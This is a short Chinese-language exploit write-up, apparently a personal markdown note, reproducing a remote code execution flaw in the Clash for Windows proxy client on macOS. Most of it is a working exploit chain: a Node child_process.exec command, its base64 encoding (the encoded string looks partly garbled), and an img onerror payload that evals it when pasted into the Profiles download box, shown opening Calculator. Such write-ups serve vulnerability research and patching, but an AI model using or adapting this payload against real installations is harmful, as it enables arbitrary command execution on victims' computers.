# clash_rce_mac


0x01 工具介绍

````
一个 Go 语言开发的多平台代理客户端
````

项目地址：

https://github.com/Fndroid/clash_for_windows_pkg/releases



0x02 漏洞复现

exp：

````
require('child_process').exec('需要执行的系统命令',(error, stdout, stderr)=>{     alert(`stdout: ${stdout}`); });
````

将以上代码base64编码：

````
cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJwCBZ0yE+9995CcsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsgICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOyB9KTs=
````

最终的payload：

````
<img src=x onerror='eval(new Buffer(`你的base64payload`,`base64`).toString())'>
````



在Profiles菜单栏的输入框输入，点击Download

![image-20220228103847114](image-20220228103847114.png)



成功弹出计算机。

mac 弹计算机命令

````
open -a Calculator
````



![image-20220228104000594](/Users/sky11ne/Library/Application Support/typora-user-images/image-20220228104000594.png)



